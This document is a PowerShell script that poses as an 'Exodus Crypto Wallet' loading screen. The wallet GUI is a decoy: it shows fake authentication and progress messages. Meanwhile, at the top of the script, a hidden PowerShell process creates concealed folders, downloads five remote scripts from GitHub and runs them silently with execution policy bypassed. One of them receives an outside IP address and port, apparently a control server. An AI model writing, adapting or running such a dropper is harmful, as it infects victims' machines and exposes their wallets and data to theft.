Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()

# TLS 1.2 für GitHub
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
} catch {}

# === Downloader + Executor in separatem, hidden PowerShell-Prozess starten ===
# Dadurch läuft er unabhängig von der GUI und bleibt aktiv, auch nach Schließen des Fensters
$downloaderCode = @'
$BasePath = "C:\Users\adsfa\AppData\Roaming\Microsoft\Windows\PowerShell"
$OperationPath = "$BasePath\operation"
$SystemPath = "$OperationPath\System"
# Versteckte Ordner anlegen (falls nicht vorhanden)
@($OperationPath, $SystemPath) | ForEach-Object {
    if (-not (Test-Path $_)) {
        New-Item -Path $_ -ItemType Directory -Force | Out-Null
        (Get-Item $_ -Force).Attributes = 'Hidden,Directory'
    }
}
$Scripts = @(
    @{ Url = "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/MicrosoftViewS.ps1"; Name = "MicrosoftViewS.ps1" }
    @{ Url = "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/Sytem.ps1"; Name = "Sytem.ps1" }
    @{ Url = "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/WindowsCeasar.ps1"; Name = "WindowsCeasar.ps1" }
    @{ Url = "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/WindowsOperator.ps1"; Name = "WindowsOperator.ps1" }
    @{ Url = "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/WindowsTransmitter.ps1"; Name = "WindowsTransmitter.ps1" }
)
# Runspace-Pool für echte Parallelität
$RunspacePool = [RunspaceFactory]::CreateRunspacePool(1, [Environment]::ProcessorCount)
$RunspacePool.Open()
$Jobs = @()
foreach ($s in $Scripts) {
    $FilePath = Join-Path $SystemPath $s.Name
   
    $PowerShell = [PowerShell]::Create().AddScript({
        param($Url, $Path, $ScriptName)
        try {
            # Download
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
            $wc.DownloadFile($Url, $Path)
            # === SPEZIELLER AUFRUF NUR FÜR MicrosoftViewS.ps1 ===
            if ($ScriptName -eq "MicrosoftViewS.ps1") {
                powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "$Path" -a14 "145.223.117.77" -a15 8080 -a16 20 -a17 70 >$null 2>&1
            }
            else {
                # Alle anderen Skripte normal ausführen (wie bisher)
                powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "$Path" >$null 2>&1
            }
        }
        catch {
            # Silent fail
        }
    }).AddArgument($s.Url).AddArgument($FilePath).AddArgument($s.Name)
    $PowerShell.RunspacePool = $RunspacePool
    $Jobs += [PSCustomObject]@{ Instance = $PowerShell; Status = $PowerShell.BeginInvoke() }
}
# Warten bis alle fertig sind (oder Timeout nach 30 Sekunden)
$endTime = (Get-Date).AddSeconds(30)
while (($Jobs.Status.IsCompleted -contains $false) -and (Get-Date) -lt $endTime) {
    Start-Sleep -Milliseconds 500
}
'@

# Starte den Downloader in einem neuen, hidden Prozess
Start-Process powershell.exe -ArgumentList "-NoProfile", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", $downloaderCode -NoNewWindow -Wait:$false

# ==================== HAUPTFENSTER ====================
$form = New-Object System.Windows.Forms.Form
$form.Text = "Exodus WALLET"
$form.StartPosition = "CenterScreen"
$form.Size = New-Object System.Drawing.Size(1200, 720)
$form.FormBorderStyle = "None"
$form.MaximizeBox = $false
$form.MinimizeBox = $false
$form.ControlBox  = $false
$form.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
$form.ForeColor = [System.Drawing.Color]::White
$form.Cursor = [System.Windows.Forms.Cursors]::WaitCursor
$form.TopMost = $true

# ==================== GRADIENT-HEADER: EXODUS (OBEN) ====================
$headerPanel = New-Object System.Windows.Forms.Panel
$headerPanel.Dock = "Top"
$headerPanel.Height = 90
$headerPanel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")

$headerPanel.Add_Paint({
    param($sender, $e)

    $g = $e.Graphics
    $g.SmoothingMode = [System.Drawing.Drawing2D.SmoothingMode]::AntiAlias

    $text = "EXODUS CRYPTO WALLET"
    $font = New-Object System.Drawing.Font(
        "Segoe UI",
        44,
        [System.Drawing.FontStyle]::Bold
    )

    $sizeF = $g.MeasureString($text, $font)
    $x = ($sender.ClientSize.Width  - $sizeF.Width)  / 2
    $y = ($sender.ClientSize.Height - $sizeF.Height) / 2

    $rect = New-Object System.Drawing.RectangleF($x, $y, $sizeF.Width, $sizeF.Height)

    $colorStart = [System.Drawing.ColorTranslator]::FromHtml("#00E5FF") # Neonblau
    $colorEnd   = [System.Drawing.ColorTranslator]::FromHtml("#7C3AED") # Violett

    $brush = New-Object System.Drawing.Drawing2D.LinearGradientBrush(
        $rect,
        $colorStart,
        $colorEnd,
        [System.Drawing.Drawing2D.LinearGradientMode]::Horizontal
    )

    $g.DrawString($text, $font, $brush, $rect.Location)

    $brush.Dispose()
    $font.Dispose()
})

$form.Controls.Add($headerPanel)

# ==================== GIF (OBEN, volle Breite, unter EXODUS) ====================
$gifUrl  = "https://raw.githubusercontent.com/KunisCode/23sdafuebvauejsdfbatzg23rS/main/loading.gif"
$gifPath = Join-Path $env:TEMP "exodus_loading.gif"

try { (New-Object System.Net.WebClient).DownloadFile($gifUrl, $gifPath) } catch {}

$pictureBox = New-Object System.Windows.Forms.PictureBox
$pictureBox.Dock = "Top"
$pictureBox.Height = 400
$pictureBox.SizeMode = "Zoom"
$pictureBox.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")

if (Test-Path $gifPath) {
    $pictureBox.Image = [System.Drawing.Image]::FromFile($gifPath)
}
$form.Controls.Add($pictureBox)

# ==================== HEADER: AUTHENTICATION (MITTE OBEN) ====================
$loadingLabel = New-Object System.Windows.Forms.Label
$loadingLabel.Font = New-Object System.Drawing.Font(
    "Segoe UI",
    30,
    [System.Drawing.FontStyle]::Bold
)
$loadingLabel.ForeColor = "White"
$loadingLabel.Dock = "Top"
$loadingLabel.Height = 80
$loadingLabel.TextAlign = "MiddleCenter"
$loadingLabel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
$form.Controls.Add($loadingLabel)

# ===================== MODERNE FORTSCHRITTSBALKEN UNTEN =====================

$progressBg = New-Object System.Windows.Forms.Panel
$progressBg.Dock = "Bottom"
$progressBg.Height = 14
$progressBg.BackColor = [System.Drawing.Color]::FromArgb(40, 40, 50)

$progressBar = New-Object System.Windows.Forms.Panel
$progressBar.Height = 14
$progressBar.Width = 0
$progressBar.BackColor = [System.Drawing.Color]::FromArgb(139,92,246)
$progressBg.Controls.Add($progressBar)

$progressBg2 = New-Object System.Windows.Forms.Panel
$progressBg2.Dock = "Bottom"
$progressBg2.Height = 6
$progressBg2.BackColor = [System.Drawing.Color]::FromArgb(30, 30, 40)

$progressBar2 = New-Object System.Windows.Forms.Panel
$progressBar2.Height = 6
$progressBar2.Width = 50
$progressBar2.BackColor = [System.Drawing.Color]::FromArgb(180,140,255)
$progressBg2.Controls.Add($progressBar2)

# ==================== STATUSLABEL UNTEN ÜBER DEN LADEBALKEN ====================
$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Font = New-Object System.Drawing.Font("Segoe UI", 14)
$statusLabel.ForeColor = "#CCCCCC"
$statusLabel.Dock = "Bottom"
$statusLabel.Height = 40
$statusLabel.TextAlign = "MiddleCenter"
$statusLabel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")

# Docking-Reihenfolge für unten: von unten nach oben
$form.Controls.Add($progressBg2)
$form.Controls.Add($progressBg)
$form.Controls.Add($statusLabel)

# ===================== TIMER SETUP =====================

$marqueePos = 0
$percent = 0

$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 50

$labelTimer = New-Object System.Windows.Forms.Timer
$labelTimer.Interval = 3000

# ===================== STATUS PHASEN =====================

$authPhaseDuration = 15000      # 15 Sekunden
$inAuthPhase = $true
$authStartTime = Get-Date

# Anfangstexte beim Start
$loadingLabel.Text = "Authenticating device..."
$statusLabel.Text  = "Performing background security checks..."

$statuses = @(
    "Loading wallet...",
    "Connecting to secure servers...",
    "Decrypting local data...",
    "Fetching asset metadata...",
    "Syncing blockchain nodes...",
    "Preparing secure environment...",
    "Loading portfolio assets...",
    "Almost there..."
)

$statusIndex = 0
$dotCount = 0

# ===================== Fortschritt / Balken Animation =====================

$timer.Add_Tick({
    try {
        if ($form.IsDisposed) { $timer.Stop(); return }

        # Wenn die Authentifizierungsphase vorbei ist → Wechsel der Texte & Animation aktivieren
        if ($inAuthPhase -and ((Get-Date) - $authStartTime).TotalMilliseconds -gt $authPhaseDuration) {
            $inAuthPhase = $false
            $loadingLabel.Text = "Loading wallet"
            $statusLabel.Text  = $statuses[0]
        }

        # Marquee immer animieren
        $marqueePos += 5
        if ($marqueePos -gt $progressBg2.Width) { $marqueePos = -50 }
        $progressBar2.Left = $marqueePos

        # In der Auth-Phase keine Prozentanzeige
        if ($inAuthPhase) { return }

        # Prozentbalken füllen
        if ($percent -lt 100) {
            $percent += 0.3
            $progressBar.Width = [int]($progressBg.Width * ($percent / 100.0))
        }

    } catch {
    }
})

# ===================== TEXT-ANIMATION =====================

$labelTimer.Add_Tick({
    try {
        if ($form.IsDisposed) { $labelTimer.Stop(); return }

        # Während Auth-Phase keine Punktanimation, kein Statuswechsel
        if ($inAuthPhase) { return }

        $dotCount = ($dotCount + 1) % 4
        $loadingLabel.Text = "Loading wallet" + ("." * $dotCount)

        $statusIndex = ($statusIndex + 1) % $statuses.Count
        $statusLabel.Text = $statuses[$statusIndex]

    } catch {
    }
})

# ===================== CLEANUP =====================
$form.Add_FormClosing({
    $timer.Stop()
    $labelTimer.Stop()
})

$timer.Start()
$labelTimer.Start()

$form.Add_Shown({ $form.Activate() })

$form.ShowDialog() | Out-Null
